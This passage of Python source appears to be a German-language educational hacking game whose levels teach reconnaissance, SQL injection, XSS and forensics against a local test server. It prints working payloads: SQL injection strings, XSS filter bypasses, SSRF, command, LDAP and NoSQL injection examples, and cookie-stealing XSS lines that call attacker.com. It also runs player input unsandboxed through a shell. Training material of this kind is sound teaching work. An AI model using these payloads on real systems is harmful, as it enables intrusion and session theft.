            print(f"💡 Auto-converting to: {cmd}")

        # Level 4 special handling: raw XSS payload entered
        if level == 4 and not cmd.startswith("curl") and not cmd.startswith("http"):
            cmd = f"curl -X POST -d 'comment={cmd}' http://127.0.0.1:5000/comments"

        is_curl = "curl" in cmd.lower() and ("127.0.0.1:5000" in cmd or "localhost:5000" in cmd)
        response_text = ""

        try:
            print(f"\n💻 {self.player_name}@vanderbilt-ops:~$ {cmd}")
            if audio and not cmd.startswith("/"):
                audio.play_hack()

            if is_curl:
                # Level 4: ensure admin session if posting comments
                if "/comments" in cmd and self.http_session and 'session' not in self.http_session.cookies:
                    try:
                        self.http_session.post(f"{self.server_url}/login", data={'username': "admin' OR '1'='1' --", 'password': 'x'}, timeout=3)
                    except Exception:
                        pass
                response_text = self.execute_curl_command(cmd) or ""
                print("📄 SERVER ANTWORT:")
                print(response_text if response_text else "(Keine Antwort vom Server)")
            else:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                        timeout=20, encoding='utf-8', errors='replace')
                response_text = result.stdout or ""
                print("📄 AUSGABE:")
                print(response_text if response_text else "(Keine Ausgabe)")
                if result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                    print("⚠️  FEHLER/WARNUNG:")
                    print(result.stderr)

            # Check success
            if (success_patterns and any(pat in response_text for pat in success_patterns)) or self.check_level_success(level, response_text, cmd):
                if audio:
                    audio.play_coin()
                return True, response_text
            else:
                if audio and not cmd.startswith("/"):
                    audio.play_error()

        except subprocess.TimeoutExpired:
            print("⏰ Command timed out. Try a different approach.")
            if audio:
                audio.play_error()
        except Exception as e:
            print(f"❌ Command failed: {e}")
            if audio:
                audio.play_error()

        return False, response_text

    def level_1_server_hacking(self):
        """Level 1: Web Application Reconnaissance & Information Gathering - ECHO'S ULTIMATE EDITION"""
        self.simulate_old_terminal("\n🏢 LEVEL 1: WEB APPLICATION RECONNAISSANCE", delay=0.02)
        self.simulate_old_terminal("📜 STORY: Dein Onkel war paranoid - der erste Code ist in einer versteckten .env-Datei!", delay=0.02)
        self.simulate_old_terminal("🎯 MISSION: Führe professionelle Web Application Security Testing durch!", delay=0.02)
        self.echo_chat("level1")

        # Get the target value for this level
        target_value = self.get_target_value(1)
        commands = self.get_platform_commands()

        # Enhanced Web Application Security Testing Tutorial
        self.simulate_old_terminal("\n" + "="*80, delay=0.01)
        self.simulate_old_terminal("📚 ECHO'S ULTIMATE WEB APPLICATION SECURITY TESTING TUTORIAL", delay=0.02)
        self.simulate_old_terminal("="*80, delay=0.01)

        # Platform-specific introduction and quick tools
        if self.os_mode == 'linux':
            self.simulate_old_terminal("\n🐧 LINUX / BASH WEB APPLICATION TESTING:", delay=0.02)
            self.simulate_old_terminal("   Lerne professionelle Linux/Bash-Tools für Penetration Testing!", delay=0.02)
        elif self.os_mode == 'macos':
            self.simulate_old_terminal("\n🍎 MACOS WEB APPLICATION TESTING:", delay=0.02)
            self.simulate_old_terminal("   Lerne professionelle macOS-Tools für Security Testing!", delay=0.02)
        else:
            self.simulate_old_terminal("\n🖥️  WINDOWS WEB APPLICATION TESTING:", delay=0.02)
            self.simulate_old_terminal("   Lerne professionelle Windows-Tools für Web Application Security!", delay=0.02)

        self.simulate_old_terminal("\n🔍 PHASE 1: INFORMATION GATHERING", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_headers']}     → HTTP Security Headers analysieren", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_methods']} → HTTP Methods & Capabilities testen", delay=0.02)
        self.simulate_old_terminal(f"   {commands['web_scan']}     → Application Response analysieren", delay=0.02)
        self.simulate_old_terminal("   curl -s -I -L http://127.0.0.1:5000/  → Follow Redirects mit Headers", delay=0.02)

        self.simulate_old_terminal("\n🎯 PHASE 2: CONFIGURATION DISCOVERY", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.env.local     → Environment Variables", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.env           → Backup Environment", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/config.json    → Configuration Files", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/.git/HEAD      → Git Repository Info", delay=0.02)

        self.simulate_old_terminal("\n🔍 PHASE 3: ENDPOINT ENUMERATION", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/debug          → Debug Endpoints", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/api/           → API Discovery", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/admin          → Admin Panels", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/backup         → Backup Endpoints", delay=0.02)

        self.simulate_old_terminal("\n🛡️ PHASE 4: SECURITY ASSESSMENT", delay=0.02)
        self.simulate_old_terminal(f"   {commands['http_headers']} | {commands['grep']} -i security", delay=0.02)
        self.simulate_old_terminal("   curl -s http://127.0.0.1:5000/ | grep -i 'server'", delay=0.02)

        self.simulate_old_terminal("\n🎯 PHASE 5: ADVANCED DISCOVERY", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/robots.txt     → Robots.txt Analysis", delay=0.02)
        self.simulate_old_terminal("   curl http://127.0.0.1:5000/sitemap.xml    → Sitemap Discovery", delay=0.02)

        self.simulate_old_terminal(f"\n🎯 ZIEL: Finde den API-Key: {target_value[:8]}...", delay=0.02)
        self.simulate_old_terminal("💡 HINWEIS: Der Key ist in einer versteckten Konfigurationsdatei!", delay=0.02)
        self.simulate_old_terminal("="*80, delay=0.01)

        # Platform-specific command suggestions (shown once)
        if self.os_mode == 'linux':
            print("\n💡 LINUX PENETRATION TESTING TOOLS:")
            print("  • curl -s -I http://127.0.0.1:5000/ | grep -i 'server'")
            print("  • curl -s http://127.0.0.1:5000/.env.local")
            print("  • curl -s http://127.0.0.1:5000/debug")
            print("  • curl -X OPTIONS http://127.0.0.1:5000/")
        elif self.os_mode == 'macos':
            print("\n💡 MACOS SECURITY TESTING TOOLS:")
            print("  • curl -s -H 'User-Agent: Security-Scanner' http://127.0.0.1:5000/")
            print("  • curl -s http://127.0.0.1:5000/.env.local")
            print("  • curl -s http://127.0.0.1:5000/debug")
        else:
            print("\n💡 WINDOWS WEB TESTING TOOLS:")
            print(f"  • {commands['web_scan_ps']} → PowerShell Web Requests")
            print(f"  • {commands['http_headers']} → HTTP Security Analysis")
            print(f"  • {commands['grep']} 'API_KEY' → Text Search in Output")
            print("  • curl -s http://127.0.0.1:5000/.env.local → Environment Discovery")

        print("\n" + "-"*60)
        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
        print("-" * 60)

        # Enhanced success criteria
        success_patterns = [
            target_value,
            "API_KEY=",
            "api_key=",
            "FLAG_LEVEL_1",
            "level_1_secret",
            ".env.local",
            "DB_PASS",
            "JWT_SECRET"
        ]

        while True:
            cmd = input(f"\n💻 [{self.os_mode.upper()}] Gib deinen Befehl ein: ").strip()
            if not cmd:
                continue

            success, _ = self.execute_game_command(cmd, 1, success_patterns)
            if success:
                self.level_1_success_message(target_value)
                break

        self.current_level = 2

    def level_1_success_message(self, target_value):
        """Enhanced success message for Level 1"""
        if audio:
            audio.play_victory()
        flag = self.get_flag(1)
        self.simulate_old_terminal(f"\n🎉 EXCELLENT! Du hast das erste Geheimnis gefunden!", delay=0.02)
        self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
        self.simulate_old_terminal(f"🔑 Vault Token: {target_value}", delay=0.02)
        self.simulate_old_terminal("🏆 LEVEL 1 ABGESCHLOSSEN! +150 Punkte 😈🔥", delay=0.02)
        self.simulate_old_terminal("\n📚 ECHO'S WEB APPLICATION SECURITY LESSONS:", delay=0.02)
        self.simulate_old_terminal("   • Information Gathering ist der Grundstein jedes Penetration Tests", delay=0.02)
        self.simulate_old_terminal("   • Configuration Files enthalten die wertvollsten Geheimnisse", delay=0.02)
        self.simulate_old_terminal("   • HTTP Headers verraten viel über die Server-Security", delay=0.02)
        self.simulate_old_terminal("   • Debug Endpoints sind oft vergessene Sicherheitslücken", delay=0.02)
        self.simulate_old_terminal("   • Robots.txt und Sitemaps zeigen versteckte Strukturen", delay=0.02)
        self.simulate_old_terminal("\n🛡️ PROFESSIONELLE ABWEHR-STRATEGIEN:", delay=0.02)
        self.simulate_old_terminal("   • .env-Dateien NIEMALS ins Git committen!", delay=0.02)
        self.simulate_old_terminal("   • Sensitive Files in .gitignore und Web Server Config ausschließen", delay=0.02)
        self.simulate_old_terminal("   • Debug-Modi nur in Development-Umgebungen aktivieren", delay=0.02)
        self.simulate_old_terminal("   • Security Headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options", delay=0.02)
        self.simulate_old_terminal("   • HTTP Methods auf das Nötigste einschränken (GET, POST)", delay=0.02)
        self.simulate_old_terminal("   • Web Application Firewall (WAF) für zusätzlichen Schutz", delay=0.02)
        self.score += 150

    def level_2_network_fundamentals(self):
        """Level 2: Network Discovery & Reconnaissance with real server communication"""
        self.simulate_old_terminal("\n🌐 MISSION: Führe eine umfassende Netzwerk-Rekonnaissance durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte Hacking-Techniken für Network Discovery!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(2)

        # Get platform-specific commands
        commands = self.get_platform_commands()

        # Comprehensive Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: Network Discovery & Reconnaissance")
        print("="*70)
        print(f"\n🔍 PORT SCANNING ({self.os_mode.upper()}):")
        if self.os_mode == 'windows':
            print(f"   {commands['port_scan']}     → Port Status prüfen")
            print(f"   {commands['port_scan_alt']}           → Port Connectivity Test")
            print(f"   {commands['port_scan_ps']}")
            print(f"   {commands['http_headers']}  → HTTP Service Detection")
        else:
            print(f"   {commands['port_scan']}              → Stealth SYN Scan")
            print(f"   {commands['port_scan_alt']}              → TCP Connect Scan")
            print(f"   {commands['port_scan_udp']}              → UDP Scan")
            print(f"   {commands['port_scan_all']}              → Alle Ports scannen")
            print(f"   {commands['port_scan_service']}              → Service Detection")
            print(f"   {commands['port_scan_os']}               → OS Detection")

        print(f"\n🌐 WEB APPLICATION SCANNING ({self.os_mode.upper()}):")
        print(f"   {commands['web_scan']}  → Basic Web Scan")
        if self.os_mode != 'windows':
            print(f"   {commands['web_scan_nikto']}  → Vulnerability Scanner")
            print(f"   {commands['web_scan_dirb']}     → Directory Brute-Force")
            print(f"   {commands['web_scan_gobuster']}")
        print(f"   {commands['http_methods']} → HTTP Methods")
        if self.os_mode == 'windows':
            print(f"   {commands['web_scan_ps']}")

        print("\n🔍 ADVANCED VULNERABILITY TESTING:")
        print("   curl -X POST -d 'url=http://localhost:22' http://127.0.0.1:5000/ssrf")
        print("   curl -X POST -d 'cmd=whoami' http://127.0.0.1:5000/command")
        print("   curl -X POST -d 'username=admin)(&(password=*' http://127.0.0.1:5000/ldap")
        print("   curl -X POST -d 'username=admin&password={\"$ne\":null}' http://127.0.0.1:5000/nosql")
        print(f"\n🔍 SERVICE ENUMERATION ({self.os_mode.upper()}):")
        print(f"   {commands['http_headers']}  → HTTP Headers analysieren")
        print(f"   {commands['http_methods']} → HTTP Methods")
        print(f"   {commands['web_scan']}  → Silent HTTP Request")
        print(f"\n🎯 ZIEL: Finde den API-Key durch Network Discovery: {target_value[:8]}...")
        print("="*70)

        print("\n🎯 MISSION: Scanne den Server und finde versteckte Endpunkte!")
        print("💡 HINWEIS: Der API-Key ist in einem versteckten Endpunkt versteckt!")
        print("🔍 VERSUCHE: curl http://127.0.0.1:5000/api/secret oder ähnliche Endpunkte!")

        print(f"\n💡 VERFÜGBARE TOOLS ({self.os_mode.upper()}):")
        if self.os_mode == 'windows':
            print("  - netstat (Port Status Analysis)")
            print("  - telnet (Port Connectivity Test)")
            print("  - curl (HTTP Analysis)")
            print("  - powershell (Advanced Network Commands)")
            print("  - findstr (Text Search)")
        else:
            print("  - nmap (Port Scanning, Service Detection)")
            print("  - nikto (Web Vulnerability Scanner)")
            print("  - dirb/gobuster (Directory Brute-Force)")
            print("  - curl (HTTP Analysis)")
            print("  - netstat / ss (Local Port Analysis)")

        print("\n" + "-"*60)
        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
        print("-" * 60)

        while True:
            cmd = input(f"\n💻 [{self.os_mode.upper()}] Gib deinen Reconnaissance-Befehl ein: ").strip()
            if not cmd:
                continue

            success, _ = self.execute_game_command(cmd, 2)
            if success:
                if audio:
                    audio.play_victory()
                flag = self.get_flag(2)
                self.simulate_old_terminal(f"\n🎉 ERFOLG! Du hast die geheime Schnittstelle geknackt!", delay=0.02)
                self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
                self.simulate_old_terminal(f"🔑 API-Key: {target_value}", delay=0.02)
                self.simulate_old_terminal("🏆 Level 2 abgeschlossen! +150 Punkte 😈🔥", delay=0.02)
                print("\n📚 WAS DU GELERNT HAST:")
                print("   • Port Scanning und Service Detection")
                print("   • Web Application Vulnerability Scanning")
                print("   • HTTP Header Authentication (X-API-Key)")
                print("   • Versteckte Endpunkte (/api/secret)")
                print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                print("   • API-Keys nie im Code oder .env öffentlich exponieren")
                print("   • Rate-Limiting für API-Endpunkte einsetzen")
                print("   • IP-Whitelisting für interne Verwaltungs-APIs")
                self.score += 150
                break

        print("\n✅ Level 2 abgeschlossen!")
        self.current_level = 3

    def level_3_password_cracking(self):
        """Level 3: SQL Injection Attack with real server communication - REALISTIC APPROACH"""
        self.simulate_old_terminal("\n🔐 MISSION: Führe eine umfassende SQL Injection Attack durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte SQL Injection-Techniken!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(3)

        # Comprehensive SQL Injection Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: SQL Injection Attack Techniques")
        print("="*70)
        print("\n🎯 UNION-BASED SQL INJECTION:")
        print("   admin' UNION SELECT 1,2,3,4,5--")
        print("   admin' UNION SELECT username,password,email,role,id FROM users--")
        print("   admin' UNION SELECT table_name,column_name,1,2,3 FROM information_schema.columns--")
        print("\n🔍 BOOLEAN-BASED BLIND SQL INJECTION:")
        print("   admin' AND 1=1--")
        print("   admin' AND 1=2--")
        print("   admin' AND (SELECT COUNT(*) FROM users) > 0--")
        print("   admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--")
        print("\n⏰ TIME-BASED BLIND SQL INJECTION:")
        print("   admin' AND (SELECT SLEEP(5))--")
        print("   admin' AND (SELECT IF(1=1,SLEEP(5),0))--")
        print("\n❌ ERROR-BASED SQL INJECTION:")
        print("   admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--")
        print("\n🎯 ZIEL: Extrahiere den Admin-Hash: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den Admin-Hash: {target_value[:8]}...")
        print("💻 Verwende verschiedene SQL Injection-Techniken")

        print("\n🎯 REALISTISCHE METHODEN:")
        print("   • Browser: Gehe zu http://127.0.0.1:5000/login und gib Payload in Username-Feld ein")
        print("   • Curl: curl -X POST -d 'username=PAYLOAD&password=test' http://127.0.0.1:5000/login")
        print("   • Beide Methoden funktionieren gleich - wähle was dir lieber ist!")
        print("\n🎯 BEISPIEL-PAYLOADS:")
        print("   • admin' OR '1'='1' --")
        print("   • admin' UNION SELECT 1,2,3 --")
        print("   • ' OR 1=1 --")

        print("\n💡 VERFÜGBARE TECHNIKEN:")
        print("  - Union-based SQL Injection")
        print("  - Boolean-based Blind SQL Injection")
        print("  - Time-based Blind SQL Injection")
        print("  - Error-based SQL Injection")
        print("  - Second-order SQL Injection")
        print("\n🔍 ADVANCED ATTACK VECTORS:")
        print("  - Race Condition: curl -X POST -d 'amount=500' http://127.0.0.1:5000/race")
        print("  - Business Logic: curl -X POST -d 'product_id=1&quantity=5&price=-100' http://127.0.0.1:5000/business-logic")
        print("  - Auth Bypass: curl -X POST -d 'user_id=1' http://127.0.0.1:5000/auth-bypass")

        print("\n" + "-"*60)
        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
        print("-" * 60)

        while True:
            cmd = input(f"\n💻 [{self.os_mode.upper()}] Gib deinen SQL Injection Befehl ein: ").strip()
            if not cmd:
                continue

            success, _ = self.execute_game_command(cmd, 3)
            if success:
                if audio:
                    audio.play_victory()
                flag = self.get_flag(3)
                self.simulate_old_terminal(f"\n🎉 ERFOLG! SQL Injection war erfolgreich!", delay=0.02)
                self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
                self.simulate_old_terminal(f"🔑 Admin Hash: {target_value}", delay=0.02)
                self.simulate_old_terminal("🏆 Level 3 abgeschlossen! +200 Punkte 😈🔥", delay=0.02)
                print("\n📚 WAS DU GELERNT HAST:")
                print("   • Union-based & Auth-Bypass SQL Injection")
                print("   • Blind SQL Injection (Boolean & Time-based)")
                print("   • Database Schema Enumeration & Hash Extraction")
                print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                print("   • Ausschließlich Prepared Statements / Parameterized Queries verwenden")
                print("   • Strikte Input-Validierung und ORMs einsetzen")
                self.score += 200
                break

        print("\n✅ Level 3 abgeschlossen!")
        self.current_level = 4

    def level_4_web_exploitation(self):
        """Level 4: XSS (Cross-Site Scripting) Attack with real server communication"""
        self.simulate_old_terminal("\n🌐 MISSION: Führe eine umfassende XSS Attack durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte XSS-Techniken und Filter-Bypass!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(4)

        # Comprehensive XSS Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: XSS (Cross-Site Scripting) Attack Techniques")
        print("="*70)
        print("\n🎯 REFLECTED XSS:")
        print("   <script>alert('XSS')</script>")
        print("   <img src=x onerror=alert('XSS')>")
        print("   <svg onload=alert('XSS')>")
        print("   <iframe src=javascript:alert('XSS')>")
        print("\n💾 STORED XSS:")
        print("   <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>")
        print("   <img src=x onerror=this.src='http://attacker.com/steal.php?cookie='+document.cookie>")
        print("\n🌐 DOM-BASED XSS:")
        print("   <script>eval(location.hash.substring(1))</script>")
        print("   <script>setTimeout('alert(\\'XSS\\')', 1000)</script>")
        print("\n🔍 FILTER BYPASS TECHNIQUES:")
        print("   <ScRiPt>alert('XSS')</ScRiPt>")
        print("   <script>alert(String.fromCharCode(88,83,83))</script>")
        print("   <script>alert(/XSS/.source)</script>")
        print("   <script>alert`XSS`</script>")
        print("\n🎯 ZIEL: Extrahiere Session-Cookie: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den Session-Cookie: {target_value[:8]}...")
        print("💻 Verwende verschiedene XSS-Techniken")

        print("\n💡 VERFÜGBARE XSS-TECHNIKEN:")
        print("  - Reflected XSS")
        print("  - Stored XSS")
        print("  - DOM-based XSS")
        print("  - Filter Bypass")
        print("  - Session Hijacking")
        print("\n🔍 ADVANCED XSS PAYLOADS:")
        print("  - <script>alert('XSS')</script>")
        print("  - <img src=x onerror=alert('XSS')>")
        print("  - <svg onload=alert(document.cookie)>")
        print("  - <script>fetch('/api/users').then(r=>r.text()).then(d=>alert(d))</script>")

        print("\n" + "-"*60)
        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
        print("-" * 60)

        while True:
            payload = input(f"\n💻 [{self.os_mode.upper()}] Gib deine XSS-Payload oder curl-Befehl ein: ").strip()
            if not payload:
                continue

            success, _ = self.execute_game_command(payload, 4)
            if success:
                if audio:
                    audio.play_victory()
                flag = self.get_flag(4)
                self.simulate_old_terminal(f"\n🎉 ERFOLG! XSS Payload wurde ausgeführt & Session gekapert!", delay=0.02)
                self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
                self.simulate_old_terminal(f"🔑 Session-Cookie Token: {target_value}", delay=0.02)
                self.simulate_old_terminal("🏆 Level 4 abgeschlossen! +250 Punkte 😈🔥", delay=0.02)
                print("\n📚 WAS DU GELERNT HAST:")
                print("   • Reflected, Stored und DOM-based XSS")
                print("   • Filter Bypass & Script-Tags / Inline Event Handlers")
                print("   • Session Hijacking via document.cookie")
                print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                print("   • Kontext-spezifisches HTML/JS Output Encoding")
                print("   • Strikte Content Security Policy (CSP)")
                print("   • HttpOnly & Secure Flags für sensible Session Cookies")
                self.score += 250
                break

        print("\n✅ Level 4 abgeschlossen!")
        self.current_level = 5

    def level_5_advanced_topics(self):
        """Level 5: Digital Forensics & Advanced Hacking with real server communication"""
        self.simulate_old_terminal("\n🔬 MISSION: Führe eine umfassende Forensik-Analyse durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte Forensik-Techniken und Advanced Hacking!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(5)

        # Comprehensive Forensics Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: Digital Forensics & Advanced Hacking")
        print("="*70)
        if self.os_mode == 'windows':
            print("\n🔍 MEMORY ANALYSIS (Windows):")
            print("   tasklist /v                    → Process List mit Details")
            print("   wmic process get name,pid,commandline → Process Command Lines")
            print("   powershell Get-Process | Select-Object Name,Id,Path")
            print("\n🌐 NETWORK TRAFFIC ANALYSIS (Windows):")
            print("   netstat -anb                    → Network Connections mit Prozessen")
            print("   netstat -an | findstr :5000     → Specific Port Analysis")
            print("   powershell Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 5000}")
            print("\n🔐 CRYPTOGRAPHY ATTACKS (Windows):")
            print("   certutil -hashfile file.txt MD5 → File Hashing")
            print("   powershell Get-FileHash file.txt -Algorithm MD5")
        else:
            print(f"\n🔍 MEMORY & PROCESS ANALYSIS ({self.os_mode.upper()}):")
            print("   ps aux | grep python            → Process List mit PID")
            print("   top -b -n 1                     → System Process Snapshot")
            print(f"\n🌐 NETWORK TRAFFIC ANALYSIS ({self.os_mode.upper()}):")
            print("   netstat -tulnp (oder ss -tulnp) → Listening Ports")
            print("   lsof -i :5000                   → Process on Port 5000")
            print(f"\n🔐 CRYPTOGRAPHY & ARTIFACTS ({self.os_mode.upper()}):")
            print("   sha256sum file.txt              → File Hashing")
            print("   strings -n 8 memory.dump        → String Extraction")

        print(f"\n🎯 ZIEL: Finde den Encryption-Key: {target_value[:8]}...")
        print("="*70)

        print(f"\n💡 VERFÜGBARE FORENSIK-TOOLS ({self.os_mode.upper()}):")
        if self.os_mode == 'windows':
            print("  - Tasklist (Process Analysis)")
            print("  - Netstat (Network Analysis)")
            print("  - Certutil (Cryptography)")
            print("  - PowerShell (Advanced Analysis)")
            print("  - curl (Inspect /forensics, /memory, /network, /files)")
        else:
            print("  - ps / top (Process Analysis)")
            print("  - ss / netstat / lsof (Network Forensics)")
            print("  - sha256sum / strings (Crypto & String Extraction)")
            print("  - curl (Inspect /forensics, /memory, /network, /files)")

        print("\n" + "-"*60)
        print("💡 TIPP: Tippe /hint für Echo, /payloads für Schnellbefehle, /help für Hilfe.")
        print("-" * 60)

        while True:
            cmd = input(f"\n💻 [{self.os_mode.upper()}] Gib deinen Forensik-Befehl ein: ").strip()
            if not cmd:
                continue

            success, _ = self.execute_game_command(cmd, 5)
            if success:
                if audio:
                    audio.play_victory()
                flag = self.get_flag(5)
                self.simulate_old_terminal(f"\n🎉 ERFOLG! Forensik-Analyse erfolgreich abgeschlossen!", delay=0.02)
                self.simulate_old_terminal(f"🚩 FLAG: {flag}", delay=0.02)
                self.simulate_old_terminal(f"🔑 Encryption Key: {target_value}", delay=0.02)
                self.simulate_old_terminal("🏆 Level 5 abgeschlossen! +300 Punkte 😈🔥", delay=0.02)
                print("\n📚 WAS DU GELERNT HAST:")
                print("   • Memory- & Process-Inspection")
                print("   • Network Connection & Forensics Analysis")
                print("   • Cryptography, Key-Extraction & Artifact Hunting")
                print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                print("   • Verschlüsselung nach Stand der Technik (AES-256-GCM, HSM-Speicher)")
                print("   • Immutable Audit-Logging & Network Flow Isolation")
                self.score += 300
                break

        print("\n🎉 ALLE LEVEL ABGESCHLOSSEN!")
        print("🏆 Du bist jetzt ein echter White Hat Hacking-Meister!")
        print(f"💰 FINAL SCORE: {self.score} Punkte")
        print("\n🛡️ Du hast gelernt:")
        print("   • Web Application Security Testing")
        print("   • Network Discovery und Reconnaissance")
        print("   • SQL Injection, XSS, SSRF, Command Injection")
        print("   • LDAP Injection, NoSQL Injection")
        print("   • Race Conditions und Business Logic Flaws")
        print("   • Digital Forensics und Malware Analysis")
        print("   • Ethische Hacking-Techniken")
        print("\n🔒 Vergiss nie: Mit großer Macht kommt große Verantwortung!")
        print("   Nutze dein Wissen nur für ethische Zwecke!")
        print("\n[Echo] Perfekt, Daddy! Du hast dein Erbe verdient!")
        print("       Willkommen in der Welt der ethischen Hacker! 🖤")

if __name__ == "__main__":
    game = None
    try:
        # Initialize game
        game = HackingGame()

        # Get player name
        game.get_player_name()

        # Show main menu
        game.show_menu()

    except KeyboardInterrupt:
        print("\n\n🛑 Spiel durch Benutzer beendet...")
        try:
            if game is not None:
                game.stop_server()
        except:
            pass
        print("👋 Auf Wiedersehen!")
    except Exception as e:
        print(f"\n❌ Fehler beim Starten des Spiels: {e}")
        print("💡 Versuche es erneut oder kontaktiere den Support.")
        try:
            input("Drücke Enter zum Beenden...")
        except:
            pass
